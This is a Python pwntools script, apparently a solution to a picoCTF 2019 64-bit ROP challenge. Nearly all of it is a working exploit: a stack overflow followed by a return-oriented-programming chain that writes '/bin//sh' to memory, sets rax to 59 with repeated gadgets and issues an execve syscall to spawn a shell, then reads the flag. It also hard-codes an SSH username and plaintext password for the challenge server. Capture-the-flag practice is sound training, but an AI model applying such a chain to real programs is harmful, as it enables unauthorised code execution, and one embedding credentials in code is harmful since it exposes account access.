from pwn import *

def exploit():
    #p = process("./vuln")
    s = ssh(host='2019shell1.picoctf.com', user='ChaaO', password="kmz317xe92")
    p = s.process("vuln", cwd="/problems/rop64_3_59cc6785d24924aff595a73b1d304ffb")

    padding = 24
    payload = ""
    payload += "A" * 24
    payload += p64(0x00000000004100d3) # pop rsi ; ret
    payload += p64(0x00000000006b90e0) # @ .data
    payload += p64(0x00000000004156f4) # pop rax ; ret
    payload += '/bin//sh'
    payload += p64(0x000000000047f561) # mov qword ptr [rsi], rax ; ret
    payload += p64(0x00000000004100d3) # pop rsi ; ret
    payload += p64(0x00000000006b90e8) # @ .data + 8
    payload += p64(0x0000000000444c50) # xor rax, rax ; ret
    payload += p64(0x000000000047f561) # mov qword ptr [rsi], rax ; ret
    payload += p64(0x0000000000400686) # pop rdi ; ret
    payload += p64(0x00000000006b90e0) # @ .data
    payload += p64(0x00000000004100d3) # pop rsi ; ret
    payload += p64(0x00000000006b90e8) # @ .data + 8
    payload += p64(0x00000000004499b5) # pop rdx ; ret
    payload += p64(0x00000000006b90e8) # @ .data + 8
    payload += p64(0x0000000000444c50) # xor rax, rax ; ret
    payload += p64(0x00000000004749c0) # add rax, 1 ; ret
    payload += p64(0x00000000004749c0) # add rax, 1 ; ret
    payload += p64(0x00000000004749c0) # add rax, 1 ; ret
    payload += p64(0x00000000004749c0) # add rax, 1 ; ret
    payload += p64(0x00000000004749c0) # add rax, 1 ; ret
    payload += p64(0x00000000004749c0) # add rax, 1 ; ret
    payload += p64(0x00000000004749c0) # add rax, 1 ; ret
    payload += p64(0x00000000004749c0) # add rax, 1 ; ret
    payload += p64(0x00000000004749c0) # add rax, 1 ; ret
    payload += p64(0x00000000004749c0) # add rax, 1 ; ret
    payload += p64(0x00000000004749c0) # add rax, 1 ; ret
    payload += p64(0x00000000004749c0) # add rax, 1 ; ret
    payload += p64(0x00000000004749c0) # add rax, 1 ; ret
    payload += p64(0x00000000004749c0) # add rax, 1 ; ret
    payload += p64(0x00000000004749c0) # add rax, 1 ; ret
    payload += p64(0x00000000004749c0) # add rax, 1 ; ret
    payload += p64(0x00000000004749c0) # add rax, 1 ; ret
    payload += p64(0x00000000004749c0) # add rax, 1 ; ret
    payload += p64(0x00000000004749c0) # add rax, 1 ; ret
    payload += p64(0x00000000004749c0) # add rax, 1 ; ret
    payload += p64(0x00000000004749c0) # add rax, 1 ; ret
    payload += p64(0x00000000004749c0) # add rax, 1 ; ret
    payload += p64(0x00000000004749c0) # add rax, 1 ; ret
    payload += p64(0x00000000004749c0) # add rax, 1 ; ret
    payload += p64(0x00000000004749c0) # add rax, 1 ; ret
    payload += p64(0x00000000004749c0) # add rax, 1 ; ret
    payload += p64(0x00000000004749c0) # add rax, 1 ; ret
    payload += p64(0x00000000004749c0) # add rax, 1 ; ret
    payload += p64(0x00000000004749c0) # add rax, 1 ; ret
    payload += p64(0x00000000004749c0) # add rax, 1 ; ret
    payload += p64(0x00000000004749c0) # add rax, 1 ; ret
    payload += p64(0x00000000004749c0) # add rax, 1 ; ret
    payload += p64(0x00000000004749c0) # add rax, 1 ; ret
    payload += p64(0x00000000004749c0) # add rax, 1 ; ret
    payload += p64(0x00000000004749c0) # add rax, 1 ; ret
    payload += p64(0x00000000004749c0) # add rax, 1 ; ret
    payload += p64(0x00000000004749c0) # add rax, 1 ; ret
    payload += p64(0x00000000004749c0) # add rax, 1 ; ret
    payload += p64(0x00000000004749c0) # add rax, 1 ; ret
    payload += p64(0x00000000004749c0) # add rax, 1 ; ret
    payload += p64(0x00000000004749c0) # add rax, 1 ; ret
    payload += p64(0x00000000004749c0) # add rax, 1 ; ret
    payload += p64(0x00000000004749c0) # add rax, 1 ; ret
    payload += p64(0x00000000004749c0) # add rax, 1 ; ret
    payload += p64(0x00000000004749c0) # add rax, 1 ; ret
    payload += p64(0x00000000004749c0) # add rax, 1 ; ret
    payload += p64(0x00000000004749c0) # add rax, 1 ; ret
    payload += p64(0x00000000004749c0) # add rax, 1 ; ret
    payload += p64(0x00000000004749c0) # add rax, 1 ; ret
    payload += p64(0x00000000004749c0) # add rax, 1 ; ret
    payload += p64(0x00000000004749c0) # add rax, 1 ; ret
    payload += p64(0x00000000004749c0) # add rax, 1 ; ret
    payload += p64(0x00000000004749c0) # add rax, 1 ; ret
    payload += p64(0x00000000004749c0) # add rax, 1 ; ret
    payload += p64(0x00000000004749c0) # add rax, 1 ; ret
    payload += p64(0x00000000004749c0) # add rax, 1 ; ret
    payload += p64(0x00000000004749c0) # add rax, 1 ; ret
    payload += p64(0x00000000004749c0) # add rax, 1 ; ret
    payload += p64(0x00000000004749c0) # add rax, 1 ; ret
    payload += p64(0x000000000047b6ff) # syscall

    #gdb.attach(p, '''
    #            b *vuln+33
    #            c
    #            ''')

    p.sendline(payload)
    p.sendline("cat flag.txt")
    p.interactive()

if __name__ == "__main__":
    exploit()
